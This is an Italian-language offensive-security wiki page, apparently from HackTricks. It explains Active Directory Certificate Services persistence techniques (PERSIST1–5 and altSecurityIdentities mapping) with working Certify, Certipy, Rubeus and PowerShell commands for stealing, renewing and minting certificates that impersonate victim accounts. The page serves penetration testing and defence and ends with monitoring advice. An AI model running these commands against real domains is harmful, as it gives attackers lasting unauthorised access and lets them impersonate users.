# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Questo è un breve riassunto dei capitoli sull'account persistence della fantastica ricerca di [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendere il furto di credenziali dell'utente attivo con i certificate – PERSIST1

In uno scenario in cui un certificate che consente l'autenticazione di dominio può essere richiesto da un user, un attacker ha l'opportunità di richiedere e rubare questo certificate per mantenere la persistence su una network. Per impostazione predefinita, il template `User` in Active Directory consente tali richieste, anche se a volte può essere disabilitato.

Usando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puoi cercare i template abilitati che consentono l'autenticazione client e poi richiederne uno:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Il potere di un certificato risiede nella sua capacità di autenticarsi come l'utente a cui appartiene, indipendentemente dai cambi di password, purché il certificato rimanga valido.

Puoi convertire PEM in PFX e usarlo per ottenere un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: Combinato con altre tecniche (vedi sezioni THEFT), l'autenticazione basata su certificati consente accesso persistente senza toccare LSASS e anche da contesti non elevati.

## Ottenere persistenza sulla macchina con i certificati - PERSIST2

Se un attaccante ha privilegi elevati su un host, può iscrivere l'account macchina del sistema compromesso per un certificato usando il template predefinito `Machine`. Autenticarsi come la macchina abilita S4U2Self per i servizi locali e può fornire persistenza duratura sull'host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendere la persistenza tramite il rinnovo del certificato - PERSIST3

Abusando dei periodi di validità e rinnovo dei template di certificato, un attaccante può mantenere un accesso a lungo termine. Se possiedi un certificato emesso in precedenza e la sua chiave privata, puoi rinnovarlo prima della scadenza per ottenere una credenziale nuova e di lunga durata, senza lasciare ulteriori artefatti di richiesta legati al principal originale.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Tieni traccia delle scadenze dei file PFX in possesso dell'attaccante e rinnova in anticipo. Il rinnovo può anche far sì che i certificati aggiornati includano la moderna estensione di mapping SID, mantenendoli utilizzabili sotto regole di mapping DC più restrittive (vedi sezione successiva).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Se puoi scrivere sull'attributo `altSecurityIdentities` di un account target, puoi mappare esplicitamente un certificato controllato dall'attaccante a quell'account. Questo persiste attraverso i cambi di password e, quando si usano formati di mapping forti, rimane funzionale sotto la moderna enforcement del DC.

Flusso ad alto livello:

1. Ottieni o emetti un certificato client-auth che controlli (ad es. enroll del template `User` come te stesso).
2. Estrai un identificatore forte dal cert (Issuer+Serial, SKI, o SHA1-PublicKey).
3. Aggiungi un mapping esplicito sul `altSecurityIdentities` del principal vittima usando quell'identificatore.
4. Autenticati con il tuo certificato; il DC lo mappa alla vittima tramite il mapping esplicito.

Esempio (PowerShell) usando un mapping forte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Poi autentica con il tuo PFX. Certipy otterrà direttamente un TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Costruire mappings `altSecurityIdentities` forti

In pratica, i mappings **Issuer+Serial** e **SKI** sono i formati forti più facili da costruire da un certificato in possesso dell'attaccante. Questo conta dopo l'**11 febbraio 2025**, quando i DC passano di default a **Full Enforcement** e i mappings deboli smettono di essere affidabili.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Note
- Usa solo tipi di mapping forti: `X509IssuerSerialNumber`, `X509SKI` o `X509SHA1PublicKey`. I formati deboli (Subject/Issuer, Subject-only, RFC822 email) sono deprecati e possono essere bloccati dalla policy del DC.
- Il mapping funziona sia sugli oggetti **user** che **computer**, quindi l'accesso in scrittura all'`altSecurityIdentities` di un account computer è sufficiente per persistere come quella macchina.
- La chain del cert deve costruirsi fino a una root trusted dal DC. Le Enterprise CA in NTAuth sono tipicamente trusted; alcuni ambienti trusted anche CA pubbliche.
- L'autenticazione Schannel resta utile per la persistence anche quando PKINIT fallisce perché il DC non ha l'EKU Smart Card Logon o restituisce `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Su domain controller **Windows Server 2022+** patchati con l'aggiornamento di sicurezza del **9 settembre 2025**, Microsoft ha aggiunto un altro formato di explicit mapping forte che è interessante per la persistence perché sopravvive alla re-issue del cert dalla stessa CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operativamente questo differisce dai vecchi formati strong:
- `Issuer+Serial` pinna **un certificato esatto**.
- `SKI` / `SHA1-PUKEY` pinna **una keypair**.
- `Issuer/SID` pinna la **CA emittente + target SID**, quindi i certificati rinnovati o riemessi dalla stessa CA continuano a funzionare senza riscrivere `altSecurityIdentities`.

Requirements and caveats
- Il certificato presentato per il logon deve contenere realmente il target account SID nell'estensione di sicurezza SID.
- Questo formato non è utile per certificati in stile `ESC9` / `ESC16` che omettono l'estensione SID; in quei casi torna a `Issuer+Serial`, `SKI`, o `SHA1-PUKEY`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{endref}}

## Enrollment Agent as Persistence – PERSIST5

Se ottieni un valido Certificate Request Agent/Enrollment Agent certificate, puoi generare nuovi certificati abilitati al logon per conto degli utenti a volontà e tenere il PFX dell'agente offline come persistence token. Flusso di abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revoca del certificato dell'agent o dei permessi del template è necessaria per rimuovere questa persistenza.

Note operative
- Le versioni moderne di `Certipy` supportano sia `-on-behalf-of` sia `-renew`, quindi un attaccante che possiede un Enrollment Agent PFX può creare e in seguito rinnovare certificati leaf senza dover interagire di nuovo con l'account target originale.
- Se il recupero del TGT basato su PKINIT non è possibile, il certificato on-behalf-of risultante è comunque utilizzabile per l'autenticazione Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Usare i certificati persistenti quando PKINIT fallisce

Se il DC non dispone di un certificato con capacità Smart Card Logon, l'accesso con certificato via PKINIT può fallire con `KDC_ERR_PADATA_TYPE_NOSUPP`. Questo non elimina il meccanismo di persistenza: lo stesso PFX è spesso ancora utilizzabile per l'accesso LDAP autenticato tramite Schannel.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Questo è particolarmente utile dopo PERSIST4/PERSIST5 perché puoi continuare a operare da Linux/macOS e concatenare altre azioni di directory persistence, come rilasciare [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) o modificare attributi di delegation scrivibili.

## 2025 Strong Certificate Mapping Enforcement: Impatto sulla Persistence

Microsoft KB5014754 ha introdotto Strong Certificate Mapping Enforcement sui domain controller. Dal **11 febbraio 2025**, i DC usano per impostazione predefinita **Full Enforcement** per mapping deboli/ambigui, e a partire dall’aggiornamento di sicurezza del **9 settembre 2025** i DC patchati non supportano più il vecchio fallback in modalità Compatibility. Implicazioni pratiche:

- I certificate pre-2022 che non hanno l’estensione di mapping SID possono fallire il mapping implicito quando i DC sono in Full Enforcement. Gli attacker possono mantenere l’accesso in due modi: rinnovando i certificate tramite AD CS (per ottenere l’estensione SID) oppure inserendo un mapping esplicito forte in `altSecurityIdentities` (PERSIST4).
- I mapping espliciti che usano formati forti (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` e, sui DC moderni, `Issuer/SID`) continuano a funzionare. I formati deboli (Issuer/Subject, Subject-only, RFC822) possono essere bloccati e andrebbero evitati per la persistence.
- Se i mapping deboli sembrano ancora funzionare, assumi di aver colpito un DC non patchato o configurato diversamente, non un percorso affidabile di persistence a lungo termine.
- I percorsi di issuance in stile `ESC9` / `ESC16` che sopprimono l’estensione SID rendono `Issuer/SID` inutilizzabile, quindi i mapping forti di fallback o il renewal tramite un template normale diventano l’opzione pratica di persistence.

Gli amministratori dovrebbero monitorare e generare alert su:
- Modifiche a `altSecurityIdentities` e issuance/renewal dei certificate Enrollment Agent e User.
- Log di issuance della CA per richieste on-behalf-of e pattern di renewal insoliti.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
